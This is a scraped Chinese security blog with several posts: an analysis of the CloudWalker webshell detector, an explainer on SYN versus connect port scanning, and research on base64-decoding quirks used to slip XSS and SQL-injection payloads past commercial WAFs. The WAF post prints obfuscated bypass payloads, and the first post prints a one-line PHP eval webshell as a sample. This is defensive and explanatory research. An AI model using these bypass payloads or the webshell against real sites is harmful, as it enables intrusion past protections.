          <a href="/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">webshell检测总结与实例分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>很久之前做过<a target="_blank" rel="noopener" href="https://gist.github.com/leveryd/161ffd8e918d70b5029ab828333837c9">webshell检测方案调研</a>，webshell可以在流量安全产品（比如waf、nids）和主机安全产品（hids）检测。</p>
<p>在流量安全产品常见的检测场景包括：</p>
<ul>
<li>文件上传接口，比如检查上传的文件名、文件内容</li>
<li>webshell访问，比如检查常见的webshell管理工具</li>
</ul>
<p>在主机安全产品常见的检测场景包括：</p>
<ul>
<li>文本内容，比如检查所有php文件是否webshell</li>
<li>内存马</li>
</ul>
<p>根据网络上公开资料总结，”文本内容”检测手段包括：<br>| webshell检测技术 | 举例<br>| - | - |<br>| 动态分析-沙箱 | <a target="_blank" rel="noopener" href="https://scanner.baidu.com/#/pages/intro">百度webdir</a> |<br>| 静态分析-正则 |<br>| 静态分析-统计学角度 |<br>| 静态分析-AST |<br>| 机器学习/深度学习 |<br>| RASP | <a target="_blank" rel="noopener" href="https://rasp.baidu.com/doc/dev/official.html">百度OpenRASP</a> |</p>
<p>长亭开源的<a target="_blank" rel="noopener" href="https://github.com/chaitin/cloudwalker">cloudwalker</a>检测方式较全，个人觉得值得学习。</p>
<p>本文简要分析cloudwalker的检测手段，应该适合正在调研webshell检测方案的读者阅读。</p>
<blockquote>
<p>PS: p牛说他们目前的方案已经和开源版本有非常大的不同，目前方案的线上demo：<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">https://forum.xray.cool/webshell</a></p>
</blockquote>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><ul>
<li><p>cloudwalker是什么？</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651372030&idx=1&sn=682c49b3decda87ddf0ed641d5d347c6&chksm=8d39c876ba4e4160e88bacf0ffc3cadc39b60a269a6facec9f62134823af829624e42df52376&token=496332164&lang=zh_CN">牧云（CloudWalker）开源手记 | Webshell 监控检测策略初探</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/45796590">牧云（CloudWalker）开源|如约而至: Webshell核心检测引擎</a></p>
<p>这两篇官方文章其实已经把检测策略介绍过了，总结起来包括四类：</p>
<ul>
<li>基于模糊哈希</li>
<li>基于模糊正则</li>
<li>基于代码风格</li>
<li>基于机器学习：模型使用svm，特征包括了三个维度（代码风格、操作序列、操作名）</li>
</ul>
</li>
</ul>
<h2 id="模糊哈希"><a href="#模糊哈希" class="headerlink" title="模糊哈希"></a>模糊哈希</h2><ul>
<li><p>是什么？</p>
<p>用<code>ssdeep</code>命令来实践，看一下生成的模糊哈希。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# echo 11 &gt;&gt; &#x2F;usr&#x2F;bin&#x2F;sleep1</span><br><span class="line">[root@vm10-50-0-18 ssdeep_test]# ssdeep &#x2F;usr&#x2F;bin&#x2F;sleep &#x2F;usr&#x2F;bin&#x2F;sleep1 -s</span><br><span class="line">ssdeep,1.1--blocksize:hash:hash,filename</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7:O35Q2Vo5FWkfJ8nXX7,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep&quot;</span><br><span class="line">768:VQ1Q5jc5QNAVo5FWQkckarfJ8JV3XAiqbolRX7B:O35Q2Vo5FWkfJ8nXX7B,&quot;&#x2F;usr&#x2F;bin&#x2F;sleep1&quot;</span><br></pre></td></tr></table></figure>

<p>可以看出来，<code>/usr/bin/sleep1</code> 在添加了两个字节的数据后，算出来的模糊哈希虽然和原来的不同，但是很相似。</p>
<p>所以可以得出结论：如果文件的”模糊哈希”相似，就很可能文件内容非常相似。</p>
</li>
<li><p>cloudwalker怎么用”模糊哈希”检测webshell？</p>
<p>在 tool/webshell-detector/bin/static/model-latest/SampleHash.txt 文件有计算好的”webshell模糊哈希列表”</p>
<p>在检测文件时，先计算出”检测对象”的模糊哈希，然后和”webshell模糊哈希列表”做相似度比较</p>
<p><img src="https://images.gitee.com/uploads/images/2021/1027/201021_0352ba68_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
</li>
</ul>
<h2 id="代码风格"><a href="#代码风格" class="headerlink" title="代码风格"></a>代码风格</h2><ul>
<li><p>是什么？</p>
<p>从代码字符串中统计出的如下信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* WM：代码中的单词总数</span><br><span class="line">* LM：代码行数</span><br><span class="line">* SPL：代码中的分号数量&#x2F;总行数</span><br><span class="line">* SR：符号比例 &#x3D; 符号长度&#x2F;总长度</span><br><span class="line">* ...</span><br></pre></td></tr></table></figure>

<p>这一部分业务逻辑在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/src/Stat.go">Stat.go</a></p>
</li>
<li><p>cloudwalker怎么用”代码风格”检测webshell？</p>
<p>在 <a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/bin/static/config/statState.json">statState.json</a> 中允许用户配置”代码风格合理范围”。cloudWalker计算出”检测对象”的”代码风格”后，会检查是否在此范围内。</p>
<p>另外，”代码风格”信息会作为机器学习模型中的特征。</p>
</li>
</ul>
<h2 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h2><ul>
<li><p>cloudwalker怎么用”机器学习”检测webshell？</p>
<p>使用了两层的机器学习。</p>
<p>第一层模型使用svm算法，特征包括三类：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 前面说的&quot;代码风格&quot;</span><br><span class="line">* &quot;操作序列模型&quot;的预测结果</span><br><span class="line">* &quot;操作名称模型&quot;的预测结果</span><br></pre></td></tr></table></figure>

<p><img src="https://images.gitee.com/uploads/images/2021/1027/201048_9220c5df_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
</li>
<li><p>“操作序列模型”是什么？</p>
<p>训练好的模型在 tool/webshell-detector/bin/static/model-latest/OpSerial.model</p>
<p>它使用svm算法，特征是”操作序列”处理后的数据。</p>
<p>“操作序列”包含了php代码中的”操作特征”。</p>
</li>
<li><p>怎么生成”操作序列”？</p>
<p>由代码获取到抽象语法树后，再由抽象语法树生成”操作序列”。</p>
<p>举个例子：</p>
<p>假设待检测的php代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[0]);?&gt;</span><br></pre></td></tr></table></figure>

<p>代码生成的抽象语法树（ast）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:512,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&#123;&quot;kind&quot;:256,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;name&quot;:&quot;_POST&quot;&#125;&#125;,&quot;dim&quot;:0&#125;&#125;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://images.gitee.com/uploads/images/2021/1027/201109_7cf149be_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
<p>对应的”操作序列”如下：</p>
<p><img src="https://images.gitee.com/uploads/images/2021/1027/201126_9af5fb47_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
<p>可以看出来，”操作序列”包含了”抽象语法树”两层之间的联系。</p>
</li>
</ul>
<h2 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h2><ul>
<li><p>怎么生成”抽象语法树”？</p>
<p>代码在 tool/webshell-detector/php 目录。</p>
<p>流程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 在cloudwalker启动时，[php.c](https:&#x2F;&#x2F;github.com&#x2F;leveryd&#x2F;cloudwalker-source-read&#x2F;blob&#x2F;master&#x2F;tool&#x2F;webshell-detector&#x2F;php&#x2F;php.c)新建子线程，并等待输入。</span><br><span class="line">* 子线程接收php代码后，解析生成&quot;抽象语法树&quot;，将结果返回给主线程。子线程通过管道与主线程通信。</span><br></pre></td></tr></table></figure>

<p>解析能力基于<a target="_blank" rel="noopener" href="https://github.com/nikic/php-ast">php-ast项目</a>，业务逻辑可以见<a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/blob/master/tool/webshell-detector/php/payload/index.php">index.php</a></p>
<p>可以运行index.php做一点简单的测试：输入包括”字符串长度”和”代码”，输出ast字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  php git:(master) ✗ .&#x2F;bin&#x2F;php payload&#x2F;index.php</span><br><span class="line">26</span><br><span class="line">&lt;?php eval(&#39;$_POST[0]&#39;);?&gt;</span><br><span class="line">142</span><br><span class="line">&#123;&quot;status&quot;:&quot;successed&quot;,&quot;ast&quot;:&#123;&quot;kind&quot;:132,&quot;flags&quot;:0,&quot;lineno&quot;:1,&quot;children&quot;:[&#123;&quot;kind&quot;:269,&quot;flags&quot;:1,&quot;lineno&quot;:1,&quot;children&quot;:&#123;&quot;expr&quot;:&quot;$_POST[0]&quot;&#125;&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/">仓库</a>中放了我阅读代码时的注释，方便有需要的读者。</p>
<p>从测试效果来看，开源版本和目前线上版本有很大差异：开源版本cloudwalker比较容易绕过，<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">线上</a>则难度大很多。</p>
<p><img src="https://images.gitee.com/uploads/images/2021/1027/201155_7f9c8ee0_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E4%B8%BA%E4%BB%80%E4%B9%88masscan%E5%BF%AB%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">为什么masscan扫描快（一）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>某天想到一个常见的安全面试问题：”为什么masscan扫描快？”</p>
<p>以往我认为是下面三点原因：</p>
<ul>
<li>使用syn扫描</li>
<li>扫描地址随机化</li>
<li>发包和接受包使用了性能更好的pf_ring包处理框架</li>
</ul>
<p>随着最近补了一些网络的基础知识，感觉有点不对劲：</p>
<ul>
<li>nmap也支持syn扫描、扫描地址随机化，所以masscan真的是因为这两点比nmap快么？</li>
<li>nmap用的是啥发包，它为什么不用pf_ring呢？</li>
<li>pf_ring真的快么？</li>
</ul>
<p>这一篇文章主要记录我对syn扫描的学习和做扫描器时遇到的案例。</p>
<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="什么是syn扫描？"><a href="#什么是syn扫描？" class="headerlink" title="什么是syn扫描？"></a>什么是syn扫描？</h2><p>  也叫半连接扫描，基于sendto系统调用。</p>
<p>  在syn扫描出现之前，端口扫描大多数基于connect系统调用，因此会完成tcp三次握手。</p>
<h2 id="为什么要用syn扫描？"><a href="#为什么要用syn扫描？" class="headerlink" title="为什么要用syn扫描？"></a>为什么要用syn扫描？</h2><p>  一般都会说syn有三个好处：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 更隐蔽（相比于connect扫描）</span><br><span class="line">* 更快（相比于connect扫描）</span><br><span class="line">* 比ACK&#x2F;Window&#x2F;Maimon scans等扫描方式（namp的-sA&#x2F;sW&#x2F;sM参数）兼容性好</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>真的更隐蔽么？</p>
<p>说syn扫描隐蔽的原因是”被扫描主机”和”IDS/IPS”设备 因为没有看到完整的”三次握手”，所以不会记录日志。</p>
<p>然而现在的防护设备似乎都认识syn扫描，所以已经没有”更隐蔽”这个优势了。</p>
</li>
<li><p>为什么比connect扫描快？</p>
<p>我以前的误区是connect扫描握手需要三个包，而syn扫描是只需要两个包，少发了一个包所以更快。</p>
<p>实际上更快的原因是：</p>
<p>当客户端发出去的syn包后收不到响应时（”网络质量不好”或者”扫描目标ip不存在”时会发生）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* connect扫描因为用的是connect系统调用，所以会重传syn包。在linux默认配置时，最多会等待32s才会返回</span><br><span class="line"></span><br><span class="line">* syn扫描因为使用sendto系统调用，它把syn包发出去后就可以立马返回，不会等syn-ack包</span><br></pre></td></tr></table></figure>

<p>一个需要阻塞等待，另一个发送完就返回了，那肯定是发完就返回的快啊。</p>
<p>看到这里，不知道你会不会质疑我：发完就返回，不等syn-ack包，那syn扫描怎么判断端口是开放的。</p>
</li>
</ul>
<h2 id="syn扫描是怎么判断端口是开放的？"><a href="#syn扫描是怎么判断端口是开放的？" class="headerlink" title="syn扫描是怎么判断端口是开放的？"></a>syn扫描是怎么判断端口是开放的？</h2><p>  虽然sendto系统调用”不等待syn-ack包”，但是当syn-ack包来的时候我们再接着处理就好了。</p>
<p>  比如当系统接收到一个syn-ack包，我们看一下包是不是从我们扫描对象发过来的，如果是我们就可以从syn-ack包中取出端口信息，认为目标端口是开放的。当然为了防止一些误报，我们还可以做一些检查。</p>
<p>  所以在syn扫描实现时，我们可以采用两个线程（masscan也是这么实现的）：</p>
<ul>
<li>一个线程专门来发syn包</li>
<li>另一个线程专门来接收syn-ack包，从syn-ack包中判断端口是否开放</li>
</ul>
<h2 id="show-me-the-demo"><a href="#show-me-the-demo" class="headerlink" title="show me the demo"></a>show me the demo</h2><p>  网上找的一个demo <a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/38642133">简单实现SYN端口扫描</a></p>
<p>  发送请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sockfd &#x3D; socket(AF_INET,SOCK_RAW,IPPROTO_TCP)  # 使用SOCK_RAW创建原始套接字</span><br><span class="line">..</span><br><span class="line">int ret &#x3D; sendto(sockfd,buffer,sizeof(tcpHeader),0,(struct sockaddr*)&amp;target,sizeof(target)) ;  # 发送syn包后立马返回</span><br></pre></td></tr></table></figure></p>
<p>  接收请求：<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">size &#x3D; recvfrom(sockfd,msg,sizeof(msg),0,(struct sockaddr*)&amp;myaddr,&amp;len) ;  &#x2F;&#x2F; 阻塞接收ack包</span><br></pre></td></tr></table></figure></p>
<h2 id="之前做扫描器实践中遇到的案例"><a href="#之前做扫描器实践中遇到的案例" class="headerlink" title="之前做扫描器实践中遇到的案例"></a>之前做扫描器实践中遇到的案例</h2><p>  端口扫描结果中发现有的ip开放了5000+个端口，并且端口上似乎没有什么业务。</p>
<p>  估摸着我可能遇到了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/2a03fb550cf5">DDOS之syn flood 原理及防护</a> 中提到的syn代理。</p>
<p>  防火墙只要遇到syn包都回syn-ack,这样syn扫描时就会认为端口是开放的。</p>
<p>  PS：下次再碰到这样的目标详细看看。如果读者有现成的目标案例，欢迎公众号私信给我。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>syn扫描比connect扫描快是因为connect扫描不太受用户程序控制，有可能等待很久。</li>
<li>syn扫描实现会有两个线程，一个线程负责发syn包，另一个线程负责接收syn-ack包、判断端口开放、回rst包</li>
</ul>
<p>另外nmap的文档关于syn扫描和connect扫描都写得很好，值得阅读。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://nmap.org/book/synscan.html#scan-methods-fig-syn-scan-open">nmap官方文档-syn扫描</a></li>
<li><a target="_blank" rel="noopener" href="https://nmap.org/book/scan-methods-connect-scan.html">nmap官方文档-connect扫描</a></li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（一）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>看过<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qF7Jgiev5B7zLEHwGXry3A">从shiro-550漏洞品阿里云waf规则引擎</a>文章的，应该知道阿里云是怎么防护shiro反序列化漏洞的利用，那么我们有办法绕过防护么？</p>
<p>先把上面的问题放一放，看看几个base64解码相关的case吧。</p>
<p>base64解码时，不同语言的接口实现有略微区别，目前知道有两种”边界情况”：</p>
<ul>
<li>字符串中包含 <code>. %</code>  等符号时，是选择忽略这些符号，还是报错</li>
<li>字符串中包含 <code>=</code> 符号，解析到<code>=</code>时，是认为解析完成了，还是忽略”等号”继续解析</li>
</ul>
<p>比如：<br>Python base64解码时，会忽略”=”号后面的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">binascii.a2b_base64(b&#39;aGVsbG8&#x3D;&#39;)       # b&#39;hello&#39; (valid)</span><br><span class="line">binascii.a2b_base64(b&#39;aGVsbG8&#x3D;&#x3D;&#39;)      # b&#39;hello&#39; (ignoring data)</span><br><span class="line">binascii.a2b_base64(b&#39;aGVsbG8&#x3D;python&#39;) # b&#39;hello&#39; (ignoring data)</span><br></pre></td></tr></table></figure>

<p>PHP base64解码时，支持编码中有<code>. %</code>  等符号，会忽略这些符号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P.HNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;</span><br><span class="line">P%HNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p>我也是从别人给Python提交的<a target="_blank" rel="noopener" href="https://bugs.python.org/issue43086">这个bug</a> 学到的一些姿势。</p>
<p>所以，我想研究以下问题：</p>
<ul>
<li>哪些语言受影响？</li>
<li>会有什么影响？<ul>
<li>什么时候会产生绕过？</li>
<li>哪些waf可以绕过？</li>
</ul>
</li>
</ul>
<h1 id="哪些语言受影响？"><a href="#哪些语言受影响？" class="headerlink" title="哪些语言受影响？"></a>哪些语言受影响？</h1><ul>
<li><p>测试思路</p>
<p>有两个两个测试目标：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 看看&quot;不同语言 对 &#x3D;&#x3D; 后面是否忽略&quot;</span><br><span class="line">2. 看看&quot;不同语言 对 . 号是否忽略&quot;</span><br></pre></td></tr></table></figure>

<p>因此，对<code>hello</code>base64编码并做点变形，得到下面三个测试paylaod</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">aGVsbG8&#x3D;test</span><br><span class="line">aGVs.bG8</span><br><span class="line">aGVs.bG8&#x3D;</span><br></pre></td></tr></table></figure>

<p>另外额外测一下shiro中base64的解码</p>
</li>
<li><p>测试的语言、版本、解码接口如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">php(7.3.11): base64_decode</span><br><span class="line"></span><br><span class="line">python(3.7): binascii.a2b_base64、base64.b64decode</span><br><span class="line"></span><br><span class="line">openresty(1.19): ngx.base64.decode_base64url</span><br><span class="line"></span><br><span class="line">java(jshell 14.0.1): Base64.getDecoder().decode</span><br><span class="line"></span><br><span class="line">shiro(1.5.1): org.apache.shiro.codec.Base64.decode</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试结果</p>
<table>
<thead>
<tr>
<th>payload</th>
<th>php</th>
<th>python</th>
<th>openresty</th>
<th>java</th>
<th>shiro</th>
</tr>
</thead>
<tbody><tr>
<td><code>aGVsbG8=test</code></td>
<td>hello-z�</td>
<td>hello</td>
<td>hello</td>
<td>抛异常</td>
<td>hello-z�</td>
</tr>
<tr>
<td><code>aGVs.bG8</code></td>
<td>hello</td>
<td>解码失败</td>
<td>解码失败</td>
<td>抛异常</td>
<td>hel</td>
</tr>
<tr>
<td><code>aGVs.bG8=</code></td>
<td>hello</td>
<td>hello</td>
<td>解码失败</td>
<td>抛异常</td>
<td>hello</td>
</tr>
<tr>
<td><code>aGVsbG8=</code></td>
<td>hello</td>
<td>hello</td>
<td>hello</td>
<td>hello</td>
<td>hello</td>
</tr>
</tbody></table>
</li>
<li><p>结论</p>
<ul>
<li>php、python、openresty、shiro 都不同程度地受变形payload影响</li>
</ul>
</li>
</ul>
<h1 id="会有什么影响？"><a href="#会有什么影响？" class="headerlink" title="会有什么影响？"></a>会有什么影响？</h1><ul>
<li><p>什么时候适用这种绕过方式？</p>
<p>以下情况下会存在绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. waf不能解码，后端可以解码</span><br><span class="line">2. waf解码后，只检测解码后的数据，不检测原始payload</span><br></pre></td></tr></table></figure>

<p>第一种情况的例子：比如发送 <code>PHN.jcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>，如果waf不能解码，就会放行。</p>
<p>第二种情况的例子：发送<code>a=aGVsbG8=&#39; union select 1 and &#39;</code>，有可能waf解码成 “hello”，认为没有危害，也会放行</p>
<p>第一种情况很常见，第二种情况目前还没有遇到案例。</p>
</li>
<li><p>哪些waf可以绕过？</p>
<p>只测试了我心中的”最强王者”(阿里云waf和长亭云waf)，都存在第一种情况的绕过。</p>
</li>
</ul>
<h1 id="规范"><a href="#规范" class="headerlink" title="规范"></a>规范</h1><ul>
<li><p>规范中是怎么定义”base64解码时对非字母如何处理”？</p>
<p><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc4648#section-3.3">rfc规范</a> 中说的是，”没有特殊情况下，遇到非字母就应该报错并拒绝继续解码”。</p>
<p>看<a target="_blank" rel="noopener" href="https://shiro.apache.org/static/1.3.0/apidocs/org/apache/shiro/codec/Base64.html">官方文档</a> shiro 是根据另外一个<a target="_blank" rel="noopener" href="https://www.ietf.org/rfc/rfc2045.txt">邮件相关的规范</a>来做的base64编解码。</p>
</li>
</ul>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>所以，现在你清楚怎么绕过shiro漏洞的防护了么？</p>
<p>另外，如果读者有第二种情况绕过的案例，欢迎公众号后台私信我。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="leveryd">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="leveryd的个人博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021-12-26-%E4%BB%8Eshiro-550%E6%BC%8F%E6%B4%9E%E5%93%81%E9%98%BF%E9%87%8C%E4%BA%91waf%E8%A7%84%E5%88%99%E5%BC%95%E6%93%8E/" class="post-title-link" itemprop="url">从shiro-550漏洞品阿里云waf规则引擎</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

